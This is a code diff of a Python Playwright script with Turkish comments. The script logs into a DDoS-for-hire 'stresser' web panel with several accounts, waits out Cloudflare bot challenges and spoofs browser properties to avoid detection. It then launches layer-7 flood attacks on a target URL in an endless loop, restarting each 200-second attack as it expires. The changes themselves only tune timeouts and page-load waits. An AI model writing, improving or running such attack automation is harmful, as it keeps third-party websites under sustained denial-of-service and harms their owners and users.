@@ -74,25 +74,25 @@ def attack_worker(account):
                     Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                 """)
 
-                # ---------- GİRİŞ ----------
+                # ---------- GİRİŞ (GÜNCEL, EVALUATE YOK) ----------
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/login", timeout=120000, wait_until="load")
+                    page.goto("https://l7srv.su/login", timeout=60000, wait_until="domcontentloaded")
                     
                     if "cf-browser-verification" in page.url or "challenge" in page.url:
-                        print(f"[{username}] ⚡ Cloudflare challenge algılandı, 20 saniye bekleniyor...")
-                        page.wait_for_timeout(20000)
-                        page.reload(wait_until="load")
+                        print(f"[{username}] ⚡ Cloudflare challenge, 30 saniye bekleniyor...")
+                        page.wait_for_timeout(30000)
+                        page.reload(wait_until="domcontentloaded")
                         page.wait_for_timeout(5000)
 
                     page.wait_for_selector("#username", timeout=30000)
                     page.fill("#username", username)
+                    page.wait_for_selector("#password", timeout=30000)
                     page.fill("#password", password)
-                    
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=30000)
                     page.click("#loginNextBtn", timeout=30000, force=True)
                     
-                    page.wait_for_url(lambda url: "/dash" in url, timeout=90000)
+                    page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                     print(f"[{username}] ✅ Giriş başarılı!")
                     consecutive_errors = 0
                 except Exception as login_err:
@@ -107,9 +107,8 @@ def attack_worker(account):
                 # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="load")
+                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="domcontentloaded")
                     page.wait_for_timeout(3000)
-                    
                     page.wait_for_selector("#layer_7", timeout=20000)
                     page.click("#layer_7", timeout=30000, force=True)
                     print(f"[{username}] ✅ #layer_7 tıklandı.")
@@ -124,15 +123,13 @@ def attack_worker(account):
                     time.sleep(wait_time)
                     continue
 
-                # ---------- ANA SALDIRI DÖNGÜSÜ (SONSUZ) ----------
+                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                 while True:
                     try:
                         page.wait_for_selector("#l7host", timeout=20000)
-                        
                         page.fill("#l7host", target_url)
                         page.select_option("#l7method", value=method)
                         page.fill("#l7time", "200")
-                        
                         page.wait_for_selector("#l7btn-attack", timeout=20000)
                         page.click("#l7btn-attack", timeout=30000, force=True)
                         print(f"[{username}] 🔥 Saldırı başladı | 200 sn")
@@ -143,25 +140,21 @@ def attack_worker(account):
                             if no_attacks.count() > 0 and no_attacks.is_visible():
                                 print(f"[{username}] ⏰ Saldırı bitti (No running attacks).")
                                 break
-                            
                             expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                             if expire_cell.count() > 0:
                                 expire_text = expire_cell.text_content().strip()
                                 if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                     print(f"[{username}] ⏰ Süre doldu.")
                                     break
-                            
                             running_badge = page.locator(".stats-content .badge:has-text('Running')").first
                             if running_badge.count() == 0:
                                 print(f"[{username}] ⏰ Attack bitti (Running yok).")
                                 break
-                            
                             time.sleep(2)
 
                         print(f"[{username}] 🔄 Sayfa yenileniyor...")
-                        page.reload(wait_until="load")
+                        page.reload(wait_until="domcontentloaded")
                         page.wait_for_timeout(3000)
-                        
                         page.wait_for_selector("#layer_7", timeout=15000)
                         page.click("#layer_7", timeout=30000, force=True)
                         page.wait_for_timeout(2000)
@@ -170,7 +163,7 @@ def attack_worker(account):
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
                         try:
-                            page.reload(wait_until="load")
+                            page.reload(wait_until="domcontentloaded")
                             page.wait_for_timeout(5000)
                             page.wait_for_selector("#layer_7", timeout=15000)
                             page.click("#layer_7", timeout=30000, force=True)
